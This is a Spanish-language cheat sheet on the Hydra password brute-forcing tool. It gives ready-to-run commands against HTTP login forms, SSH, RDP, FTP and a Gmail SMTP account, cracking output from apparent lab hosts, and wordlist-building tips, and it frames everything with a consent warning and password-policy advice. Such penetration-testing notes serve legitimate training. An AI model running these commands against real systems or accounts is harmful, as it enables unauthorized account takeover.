
# Hydra

{% embed url="<https://github.com/vanhauser-thc/thc-hydra>" %}

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a realizar ataques de fuerza bruta a distintos sistemas, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

{% hint style="success" %}
Para prevenir este tipo de ataques, es importante implementar políticas de contraseñas fuertes y limitar el número de intentos de inicio de sesión fallidos antes de bloquear una cuenta.
{% endhint %}

## <mark style="color:purple;">Instalación</mark>

Para utilizar Hydra en Kali Linux, sigue los siguientes pasos:

1. Abre la terminal en Kali Linux.
2. Instala Hydra utilizando el siguiente comando:

```bash
sudo apt-get install hydra
```

3. Verifica que Hydra esté instalado utilizando el siguiente comando:

```bash
hydra --version
```

4. Identifica el servicio que deseas probar con Hydra. Hydra es compatible con una amplia variedad de servicios de red, incluyendo FTP, SSH, Telnet, HTTP y más.

## <mark style="color:purple;">Ejemplos</mark>

* `-l` Usuario que sabemos.
* `-L` Usuario que no sabemos (usar diccionario)
* `-p` Contraseña que sabemos
* `-P` Contraseña que no sabemos (usar diccionario)
* `http://` especifica el servicio que se está probando y la dirección IP del servidor.

### Bruteforce de contraseña con usuario que sabemos

```bash
hydra -l <username> -P /usr/share/wordlists/rockyou.txt http://<IP_Address>
```

### Bruteforce de usuario y contraseña

```bash
hydra -L /usr/share/wordlists/users.txt -P /usr/share/wordlists/rockyou.txt http://<IP_Address>
```

### Bruteforce de login

* Analizar con BurpSuite si la petición se envía por GET o POST
* Añadir el mensaje de error o el nombre del form para dar más info a hydra

```bash
sudo hydra -l {USER} -P /usr/share/wordlists/rockyou.txt {TARGET} http-post-form '/{TARGET}:username^USER^&password=^PASS^&Login=Login:{mensaje de error}'
```

{% code title="Parámetros Burpsuite" %}

```
http-post-form "/admin_login.php:username=^USER^&password=^PASS^:F=<form name='log-in'"
```

{% endcode %}

* Ejemplo completo

```bash
hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 157.245.33.122 -s 22 http-post-form "/admin_login.php:username=^USER^&password=^PASS^:F=<form name='log-in'"
```

### Bruteforce de SSH

```bash
hydra -L username.list -P password.list ssh://10.129.202.136 

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-08 09:41:16
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 21112 login tries (l:104/p:203), ~1320 tries per task
[DATA] attacking ssh://10.129.202.136:22/
[STATUS] 156.00 tries/min, 156 tries in 00:01h, 20958 to do in 02:15h, 14 active
[22][ssh] host: 10.129.202.136   login: dennis   password: rockstar
```

### Bruteforce de RDP

{% code overflow="wrap" %}

```bash
hydra -L username.list -P password.list rdp://10.129.202.136

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-08 09:51:50
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 21112 login tries (l:104/p:203), ~5278 tries per task
[DATA] attacking rdp://10.129.202.136:3389/
[3389][rdp] account on 10.129.202.136 might be valid but account not active for remote desktop: login: john password: november, continuing attacking the account.
               |------------------------------|     
```

{% endcode %}

### Bruteforce de login con PHPSESSID

{% code overflow="wrap" %}

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 'http-post-form://{IP o dominio}/login.php/:usuario=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=de9d7393766a6a444996b9ee1180b6e2; security=low:F=Username and/or password incorrect'
```

{% endcode %}

### Bruteforce a Gmail

```bash
sudo hydra -l user@gmail.com -P wordlist.txt -s 465 -S -v -V -t 4 smtp.gmail.com smtp
```

### Bruteforce generando contraseñas automáticamente

El comando `hydra -x` se utiliza en Hydra para realizar ataques de fuerza bruta generando automáticamente contraseñas basadas en un patrón definido por el usuario. Esta opción es útil cuando se tiene conocimiento sobre la estructura de las contraseñas y se desea probar diferentes combinaciones de caracteres.

La sintaxis básica del comando `hydra -x` es la siguiente:

```bash
sudo hydra -l <usuario> -x <min>:<max>:<patrón> <protocolo>://<objetivo>
```

* `<usuario>`: Especifica el nombre de usuario objetivo.
* `<min>` y `<max>`: Representan la longitud mínima y máxima de la contraseña a generar.
* `<patrón>`: Define el patrón de generación de contraseñas. Puedes utilizar caracteres como "?" para representar espacios donde se generarán las combinaciones.
* `<protocolo>`: Especifica el protocolo a atacar, como `ftp`, `http`, `pop3`, etc.
* `<objetivo>`: La dirección del objetivo.

Por ejemplo, para realizar un ataque de fuerza bruta generando contraseñas de <mark style="color:purple;">6 a 8 caracteres alfanuméricos</mark> para un usuario "<mark style="color:purple;">admin</mark>" en un servidor <mark style="color:purple;">FTP</mark>, podrías usar el siguiente comando:

```bash
sudo hydra -l admin -x 6:8:aA1 ftp://ejemplo.com
```

## <mark style="color:purple;">Guía rápida</mark>

| **Comando**                                                                                                                            | **Descripción**                                                                          |
| -------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------- |
| `hydra -h`                                                                                                                             | Menú de ayuda                                                                            |
| `hydra -C wordlist.txt SERVER_IP -s PORT http-get /`                                                                                   | Fuerza bruta de autenticación básica - Lista de palabras combinada                       |
| `hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /`                                                             | Fuerza bruta de autenticación básica - Listas de palabras de usuario/contraseña          |
| `hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"` | Fuerza bruta de formulario de inicio de sesión - Usuario que sabemos + lista contraseñas |
| `hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4`                                                                     | SSH Brute Force - Listas de palabras de usuario/contraseña                               |
| `hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1`                                                                                   | FTP Brute Force - Usuario que sabemos + lista contraseñas                                |

## <mark style="color:purple;">Wordlists</mark>

| **Wordlist**                                                                      | **Descripción**                     |
| --------------------------------------------------------------------------------- | ----------------------------------- |
| `/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt` | Wordlist de contraseñas por defecto |
| `/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt`                      | Wordlist de contraseñas comunes     |
| `/usr/share/seclists/Usernames/Names/names.txt`                                   | Wordlist de nombres comunes         |

## <mark style="color:purple;">Misc</mark>

| **Comando**                                     | **Descripción**                              |
| ----------------------------------------------- | -------------------------------------------- |
| `cupp -i`                                       | Crear diccionarios custom                    |
| `sed -ri '/^.{,7}$/d' william.txt`              | Eliminar Passwords menores de 8 caracteres   |
| ``sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt`` | Eliminar Passwords sin caracteres especiales |
| `sed -ri '/[0-9]+/!d' william.txt`              | Eliminar Passwords sin números               |
| `./username-anarchy Bill Gates > bill.txt`      | Generar listado de Usernames                 |
| `ssh b.gates@SERVER_IP -p PORT`                 | Conectar por SSH a un host                   |
| `ftp 127.0.0.1`                                 | Conectar por FTP a un host                   |
| `su - user`                                     | Cambiar a usuario                            |
